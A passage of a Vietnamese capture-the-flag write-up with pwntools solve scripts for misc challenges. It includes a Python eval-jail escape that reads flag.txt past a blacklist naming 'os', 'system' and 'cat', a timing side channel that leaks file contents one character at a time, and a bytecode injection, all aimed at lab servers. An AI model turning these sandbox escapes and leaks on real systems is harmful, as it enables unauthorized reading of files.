
## Misc


### 1. Character

---
**_TASK_**

Mình kết nối đến sever thì được yêu cầu nhập một số và số ta sẽ nhận lại được flag tại vị trí đó. Nên mình viết một script đơn giản để gửi tất cả các số tới khi nhận được ký tự "}".

---
```py
from pwn import *

def main() -> None:
    i = 0
    s = remote("83.136.252.194", 57105)

    while True:
        s.recvuntil(b"Enter an index: ")

        s.sendline(f"{i}".encode())
        
        s.recvuntil(f"at Index {i}: ".encode())
        print(s.recvline()[:-1].decode(), end="", flush=True)
        i += 1

if __name__ == "__main__":
    main()
    
```

### 2. Unbreakable

---
**_SOURCE:_**

```py
#!/usr/bin/python3

banner1 = '''
                   __ooooooooo__
              oOOOOOOOOOOOOOOOOOOOOOo
          oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
       oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
     oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
   oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
  oOOOOOOOOOOO*  *OOOOOOOOOOOOOO*  *OOOOOOOOOOOOo
 oOOOOOOOOOOO      OOOOOOOOOOOO      OOOOOOOOOOOOo
 oOOOOOOOOOOOOo  oOOOOOOOOOOOOOOo  oOOOOOOOOOOOOOo
oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
oOOOO     OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO     OOOOo
oOOOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOOOo
 *OOOOO  OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO  OOOOO*
 *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
  *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
   *OOOOOOo  *OOOOOOOOOOOOOOOOOOOOOOO*  oOOOOOO*
     *OOOOOOOo  *OOOOOOOOOOOOOOOOO*  oOOOOOOO*
       *OOOOOOOOo  *OOOOOOOOOOO*  oOOOOOOOO*      
          *OOOOOOOOo           oOOOOOOOO*      
              *OOOOOOOOOOOOOOOOOOOOO*          
                   ""ooooooooo""
'''

banner2 = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠉⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣼⣰⢷⡤⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠉⣿⠈⢻⡀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢹⡀⠀⢷⡀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠘⣧⠀⢸⡇⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠶⠾⠿⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠘⣦⠀⣇⠀⠘⣿⣤⣶⡶⠶⠛⠛⠛⠛⠶⠶⣤⣾⠋⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠘⣦⣿⠀⠀⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡟⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣦⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠁⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⢰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠶⠛⠉⢀⣄⠀⠀⠀⢀⣿⠃⠀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣠⡶⠟⠋⠁⠀⠀⠀⣼⡇⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⣀⣀⣠⠿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀⠀⣀⣤⣤⣿⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⢻⡇⠀⠀⠀⠀⢠⣄⠀⢶⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠟⠛⠋⠹⢿⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀⠘⢷⡄⠙⣧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⠁⠀⠀⠀⠀⠘⢸⡀⠀⠿⠀⠀⠀⣠⣤⣤⣄⣄⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣀⡀⠀⠀⠀⢸⡟⠻⣿⣦⡀⠀⠀⠀⠙⢾⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⣴⡏⠁⠀⠀⠹⣷⠀⠀⠀⠀⣠⡿⠋⠀⠀⠈⣷⠀⠀⠀⣾⠃⠀⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡆⠀⠀⠀⠘⢷⣄⡀⣀⣠⣿⠀⠀⠀⠀⠻⣧⣄⣀⣠⣴⠿⠁⠀⢠⡟⠀⠀⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡽⣦⡀⣀⠀⠀⠉⠉⠉⠉⠀⢀⣀⣀⡀⠀⠉⠉⠉⠁⠀⠀⠀⣠⡿⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠈⢿⣿⣧⣄⠀⠀⠰⣦⣀⣭⡿⣟⣍⣀⣿⠆⠀⠀⡀⣠⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣤⣽⣷⣤⣤⠀⠀⠀⠀⠀
⠀⢀⣿⡆⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⢀⣴⠖⠋⠁⠈⠻⣿⣿⣿⣶⣶⣤⡉⠉⠀⠈⠉⢉⣀⣤⣶⣶⣿⣿⣿⠃⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠉⠻⣷⣄⠀⠀⠀
⠀⣼⡏⣿⠀⢀⣤⠽⠖⠒⠒⠲⣤⣤⡾⠋⠀⠀⠀⠀⠀⠈⠈⠙⢿⣿⣿⣿⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⣀⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⠀⠀
⢰⣿⠁⢹⠀⠈⠀⠀⠀⠀⠀⠀⠀⣿⠷⠦⠄⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⢀⣠⠶⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀
⣸⡇⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠉⠉⠛⠋⠉⠙⢧⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆
⣿⡇⠀⠀⠈⠆⠀⠀⣠⠟⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⣸⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡇
⢻⣧⠀⠀⠀⠀⠀⣸⣥⣄⡀⠀⠀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠂⠀⠀⠀⠀⠀⠀⣿⡇
⢸⣿⣦⠀⠀⠀⠚⠉⠀⠈⠉⠻⣾⣿⡏⢻⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣟⢘⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠐⡟⠀⠀⠀⠀⠀⠀⢀⣿⠁
⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣇⠈⠻⠷⠦⠤⣄⣀⣀⣀⣀⣠⣿⣿⣄⠀⠀⠀⠀⠀⣠⡾⠋⠄⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⣸⠟⠀
⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⣔⠢⠤⠤⠀⠀⠈⠉⠉⠉⢤⠀⠙⠓⠦⠤⣤⣼⠋⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⠀⢰⠏⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀
⠀⢻⣷⣖⠦⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠈⢳⡀⠈⠛⢦⣀⡀⠀⠀⠘⢷⠀⠀⠀⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⣠⠏⠀⠀⠀⠀⣀⣴⡿⠋⠀⠀⠀
⠀⠀⠙⠻⣦⡀⠈⠛⠆⠀⠀⠀⣠⣤⡤⠀⠿⣤⣀⡙⠢⠀⠀⠈⠙⠃⣠⣤⠾⠓⠛⠛⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡴⠞⠁⢀⣠⣤⠖⢛⣿⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢷⣤⡁⠀⣴⠞⠁⠀⠀⠀⠀⠈⠙⠿⣷⣄⣀⣠⠶⠞⠋⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠞⠋⠁⠀⢀⣾⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣧⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣤⣀⣀⠀⠀⠈⠂⢀⣤⠾⠋⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⣠⠎⣠⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⣦⠀⠀⠀⠀⠀⠀⠀⣿⣇⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢐⣯⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠸⣆⠀⠀⠲⣆⠀⠀⢸⣿⣶⣮⣉⡙⠓⠒⠒⠒⠒⠒⠈⠉⠁⠀⠀⠀⠀⠀⢀⣶⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠷⠾⠷⣦⣾⠟⠻⠟⠛⠁⠀⠈⠛⠛⢿⣶⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⣨⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⠛⠛⠻⠿⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
'''

blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%', 
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's', 
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()
  
  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n")
```
---

hàm eval() là hàm sẽ thực thi những câu lệnh python mà ta viết trong đó dưới dạng str. Nhưng những str ta nhập phải vượt qua black list chặn rất nhiều những ký tự và hàm quan trọng. Ta đã biết rằng flag được chứa trong file "flag.txt" nên bây giờ ta cần gửi một đoạn code có thể mở file đó và in ra cho chúng ta flag mà hàm open() và print() đều thỏa mãn backlist nên dùng nó gửi đi là có được flag.

```py
# nc 

from pwn import *

def main() -> None:

    s = remote("83.136.252.194", 45881)

    print(s.recvuntil(b"\n\n").decode())
    s.sendline(b"print(open('flag.txt','r').read())#")
    print(s.recvuntil(b'}').decode())

if __name__ == "__main__":
    main()
```

### 3. Stop Drop and Roll

---
**_SOURCE:_**

```py
import random

CHOICES = ["GORGE", "PHREAK", "FIRE"]

print("===== THE FRAY: THE VIDEO GAME =====")
print("Welcome!")
print("This video game is very simple")
print("You are a competitor in The Fray, running the GAUNTLET")
print("I will give you one of three scenarios: GORGE, PHREAK or FIRE")
print("You have to tell me if I need to STOP, DROP or ROLL")
print("If I tell you there's a GORGE, you send back STOP")
print("If I tell you there's a PHREAK, you send back DROP")
print("If I tell you there's a FIRE, you send back ROLL")
print("Sometimes, I will send back more than one! Like this: ")
print("GORGE, FIRE, PHREAK")
print("In this case, you need to send back STOP-ROLL-DROP!")

ready = input("Are you ready? (y/n) ")

if ready.lower() != "y":
    print("That's a shame!")
    exit(0)

print("Ok then! Let's go!")

count = 0
tasks = []

for _ in range(500):
    tasks = []
    count = random.randint(1, 5)

    for _ in range(count):
        tasks.append(random.choice(CHOICES))

    print(', '.join(tasks))

    result = input("What do you do? ")
    correct_result = "-".join(tasks).replace("GORGE", "STOP").replace("PHREAK", "DROP").replace("FIRE", "ROLL")

    if result != correct_result:
        print("Unfortunate! You died!")
        exit(0)

print(f"Fantastic work! The flag is {FLAG}")
```
---

Bài này cũng không có gì ta chỉ cần nhận vào một list rồi gửi lại một list khác với các giá trị tương ứng là được. Đề bài cho ta một chuỗi các sữ kiện như GORGE, PHREAK và FIRE và ta cần phải gửi lại sao cho thỏa mãn

```py
print("If I tell you there's a GORGE, you send back STOP")
print("If I tell you there's a PHREAK, you send back DROP")
print("If I tell you there's a FIRE, you send back ROLL")
```

nên mình viết một đoạn code đơn giản thay thế các ký tự bằng ký tự thay thế là xong.

```py
# nc 83.136.251.232 58416

from pwn import *

def main() -> None:

    s = remote("83.136.251.232", 58416)

    s.sendlineafter(b'(y/n) ', b'y')
    s.recvline()

    while True:
        recv = s.recvlineS().strip()
        print(recv)

        result = recv.replace(", ", "-")
        result = result.replace("GORGE", "STOP")
        result = result.replace("PHREAK", "DROP")
        result = result.replace("FIRE", "ROLL")

        s.sendlineafter(b'do? ', result.encode())


if __name__ == "__main__":
    main()
```


### 4. Cubicle Riddle
---

**_SOURCE:_**

[here](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/misc/%5BEasy%5D%20Cubicle%20Riddle/release/misc_cubicle_riddle.zip) :v

---

Bài này có mấu chốt chủ yếu là ở phần này:

```py
 
    def _construct_answer(self, answer: bytes) -> types.CodeType:
        co_code: bytearray = bytearray(self.co_code_start)
        co_code.extend(answer)
        co_code.extend(self.co_code_end)
        code_obj: types.CodeType = types.CodeType(
            1,
            0,
            0,
            4,
            3,
            3,
            bytes(co_code),
            (None, self.max_int, self.min_int),
            (),
            ("num_list", "min", "max", "num"),
            __file__,
            "_answer_func",
            "_answer_func",
            1,
            b"",
            b"",
            (),
            (),
        )
  ```

mình có thể gửi một đoạn bytes vào phần co_de. Chúng ta cần chú ý đến một vài phần sau:

+ codeobject.co_consts là mảng tuple chứa các giá trị của hàm, ở trong trường hợp này là (None, self.max_int, self.min_int)
+ codeobject.co_varnames là mảng gồm tên của các biến trong hàm, ở trong trường hợp này là ("num_list", "min", "max", "num")
+ codeobject.co_code đây là phần quan trong nhất, là một chuỗi byte biểu thị chuỗi hướng dẫn mã byte trong hàm.
  
Từ đó chúng ta có thể gán giá trị của một số nào đó cho min, max rồi có thể trả nó về. Trong python có hỗ trợ thư viện [này](https://unpyc.sourceforge.net/Opcodes.html) giúp chuyển hàm thành dạng code.

Tổng hợp tất cả các thông tin đã có như sau: ta viết một hàm tìm ra giá trị lớn nhất, nhỏ nhất của nums_list rồi lưu lại vào biến min, max đã có sẵn, sau đó chuyển nó thành dạng bytes và gửi nó đi là ta thành công có được flag.

```py
from pwn import *
def _answer_func(num_list: int):
    min: int = 1000
    max: int = -1000
    for num in num_list:
        if num < min:
            min = num
        if num > max:
            max = num
    return (min, max)

def main() -> None:
    s = remote("94.237.54.30", 56070)
    ans: bytes = _answer_func.__code__.co_code
    ans = ",".join([str(x) for x in ans])
    print(ans)
    
    print(s.recvuntil(b"(Choose wisely) > ").decode())
    s.sendline(b"1")
    print(s.recvuntil(b"(Answer wisely) >").decode())
    s.sendline(ans.encode())
    print(s.recvuntil(b"}").decode())
if __name__ == "__main__":
    main()

```

### 5. MultiDigilingual

---
**_TASK:_**

```py
****************************************
*   How many languages can you talk?   *
*        Pass a program that's         *
*   all of the below that just reads   *
*      the file `flag.txt` to win      *
*          and pass the test.          *
*                                      *
*              Languages:              *
*               * Python3              *
*               * Perl                 *
*               * Ruby                 *
*               * PHP8                 *
*               * C                    *
*               * C++                  *
*                                      *
*   Succeed in this and you will be    *
*               rewarded!              *
****************************************

Enter the program of many languages (input in base64):
```

---

Bài này khá là hay. Có thể giải theo cách timming attack. Đề bài yêu cầu ta phải nhập vào một program có thể chạy được nhiều ngôn ngữ để đọc file, máy chủ sẽ chạy file đó qua từng ngôn ngữ khác nhau cho tới khi thỏa mãn hết sẽ in ra flag. Nhưng việc code như vậy sẽ khá tốn công nên lợi dụng việc chương trình chạy code mà ta gửi để có thể lợi dựng điều đó để chạy một vài hàm leak ra thông tin gì đó về flag (ở đây nó leak ra dưới dạng thời gian phản hồi).

Khi ta gửi chương trình này:


```py
import time
flag = open('flag.txt', 'r').read()
time.sleep(ord(flag[{i}]) / 10)
```
Máy chủ sẽ chạy nó, trong khi nó vẫn thỏa mãn yêu cầu của sever và cũng leak cho chúng ta thông tin thêm về flag.

Từ đó, ta gửi yêu cầu nhiều lần lên lên máy chủ, mỗi lần đọc từng ký tự của flag khi đó chương trình sẽ tạm dừng chương trình một khoảng thời gian đúng bằng (ord(flag) / 10) nên ta tính toán khoảng thời gian chênh lệch là ta có flag ( trong đoạn code có bị trừ đi cho 2 là do một vài yếu tố mội trường như tốc độ mang, máy tính ảnh hưởng tới thời gian)

```py

import time
from base64 import *
from pwn import *

def main() -> None:

    flag = ""

    for i in range(100):

        code = f"""
import time
flag = open('flag.txt', 'r').read()
time.sleep(ord(flag[{i}]) / 10)
"""
        s = remote("94.237.63.93", 38070)

        s.recvuntil(b'Enter the program of many languages: ')
        start = time.time()
        s.sendline(b64encode(code.encode()))
        s.recvuntil(b'[+] Completed. Checking output')
        end = time.time()

        flag += chr(int((end - start)* 10) - 2)
        print(flag)

        s.close()

        if flag[-1] == "}":
            break

if __name__ == "__main__":
    main()

```
Một cách khá cũng khá hay mình tham khảo trên mạng. Mình viết một file thỏa mãn tất cả các ngôn ngữ ở trên.


```py
#include/*
#<?php eval('echo file_get_contents("flag.txt", true);')?>
q="""*/<stdio.h>
int main() {char s[500];fgets(s, 500, fopen((const char[]){'f','l','a','g','.','t','x','t','\x00'}, (const char[]){'r', '\x00'})); {puts(s);}if(1);
	else	{}} /*=;
open(my $file, 'flag.txt');print(<$file>)#";print(puts File.read('flag.txt'));#""";print(open('flag.txt').read())#*/
```


### 6. colored_squares

---

**_SOURCE:_**

[here](https://esolangs.org/wiki/Folders)

---

Khi mở file này ra ta thấy đâ gồm rất nhiều file (hơn 3000) và bên trong hầu như trống và không có nhiều ký tự.

Sau một hồi loai hoay tìm hiểu thì mình nhận ra đây là một kiểu script tương tự như brainfuck. Nền lên mạng thì tìm thấy thư viện [này](https://github.com/SinaKhalili/Folders.py) có thể chuyển nó về file python. Đây là code sau khi mình đã chuyển.

```py
print("Enter the flag in decimal (one character per line) :\n", end='', flush=True)
var_0 = input()
if var_0.isdigit():
    var_0 = int(var_0)
else:
    var_0 = var_0
var_1 = input()
if var_1.isdigit():
    var_1 = int(var_1)
else:
    var_1 = var_1
var_2 = input()
if var_2.isdigit():
    var_2 = int(var_2)
else:
    var_2 = var_2
var_3 = input()
if var_3.isdigit():
    var_3 = int(var_3)
else:
    var_3 = var_3
var_4 = input()
if var_4.isdigit():
    var_4 = int(var_4)
else:
    var_4 = var_4
var_5 = input()
if var_5.isdigit():
    var_5 = int(var_5)
else:
    var_5 = var_5
var_6 = input()
if var_6.isdigit():
    var_6 = int(var_6)
else:
    var_6 = var_6
var_7 = input()
if var_7.isdigit():
    var_7 = int(var_7)
else:
    var_7 = var_7
var_8 = input()
if var_8.isdigit():
    var_8 = int(var_8)
else:
    var_8 = var_8
var_9 = input()
if var_9.isdigit():
    var_9 = int(var_9)
else:
    var_9 = var_9
var_10 = input()
if var_10.isdigit():
    var_10 = int(var_10)
else:
    var_10 = var_10
var_11 = input()
if var_11.isdigit():
    var_11 = int(var_11)
else:
    var_11 = var_11
var_12 = input()
if var_12.isdigit():
    var_12 = int(var_12)
else:
    var_12 = var_12
var_13 = input()
if var_13.isdigit():
    var_13 = int(var_13)
else:
    var_13 = var_13
var_14 = input()
if var_14.isdigit():
    var_14 = int(var_14)
else:
    var_14 = var_14
var_15 = input()
if var_15.isdigit():
    var_15 = int(var_15)
else:
    var_15 = var_15
var_16 = input()
if var_16.isdigit():
    var_16 = int(var_16)
else:
    var_16 = var_16
var_17 = input()
if var_17.isdigit():
    var_17 = int(var_17)
else:
    var_17 = var_17
var_18 = input()
if var_18.isdigit():
    var_18 = int(var_18)
else:
    var_18 = var_18
var_19 = input()
if var_19.isdigit():
    var_19 = int(var_19)
else:
    var_19 = var_19
var_20 = input()
if var_20.isdigit():
    var_20 = int(var_20)
else:
    var_20 = var_20
var_21 = input()
if var_21.isdigit():
    var_21 = int(var_21)
else:
    var_21 = var_21
if (((var_7) - (var_18)) == ((var_8) - (var_9))):
    if (((var_6) + (var_10)) == (((var_16) + (var_20)) + (12))):
        if (((var_8) * (var_14)) == (((var_13) * (var_18)) * (2))):
            if ((var_19) == (var_6)):
                if (((var_9) + (1)) == ((var_17) - (1))):
                    if (((var_11) / ((var_5) + (7))) == (2)):
                        if (((var_5) + ((var_2) / (2))) == (var_1)):
                            if (((var_16) - (9)) == ((var_13) + (4))):
                                if (((var_12) / (3)) == (17)):
                                    if ((((var_4) - (var_5)) + (var_12)) == ((var_14) + (20))):
                                        if ((((var_12) * (var_15)) / (var_14)) == (24)):
                                            if ((var_18) == ((173) - (var_4))):
                                                if ((var_6) == ((63) + (var_5))):
                                                    if (((32) * (var_16)) == ((var_7) * (var_0))):
                                                        if ((125) == (var_21)):
                                                            if (((var_3) - (var_2)) == (57)):
                                                                if (((var_17) - (var_15)) == ((var_18) + (1))):
                                                                    print("Good job! :)", end='', flush=True)
```
Mình được một đoạn code khác dung để check flag.
Thấy flag có 22 ký tự và các ký tự thỏa mãn với nhau theo các điều kiện trong hàm if nên từ đó ta có 22 ẩn và rất nhiều phương trình. Sử dụng các điều kiện ở trên với điều kiện các ký tự kia thuộc ascii và ta có thể đọc được nên ta gán khoảng giá trị cho nó 44 < x < 125, ngoài ra ta cũng có flag form là HTB{..} tương ứng với các vị trí trong flag nên ta cũng sử dụng nó để tính. Và đây là code (gần) của mình.
Từ đó mình có hướng dử dụng z3 để giải hệ phương trình 22 ấn. Nhưng sau khi chạy script xong thì vẫn còn một vài chỗ trong flag bị sai nên mình phải đoán flag một chút.
```py


from z3 import *

def main() -> None:
    
    flag: BitVecs = BitVecs('v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21', 8)

    s = Solver()

    s.add(flag[7] - flag[18] == flag[8] - flag[9])
    s.add(flag[6] + flag[10] == flag[16] + flag[20] + 12)
    s.add(flag[8] * flag[14] == 2 * flag[18] * flag[13])
    s.add(flag[19] == flag[6])
    s.add(flag[9] + 1 == flag[17] - 1)
    s.add(flag[11] == 2 * (flag[5] + 7))
    s.add(flag[5] + flag[2]/2 == flag[1])
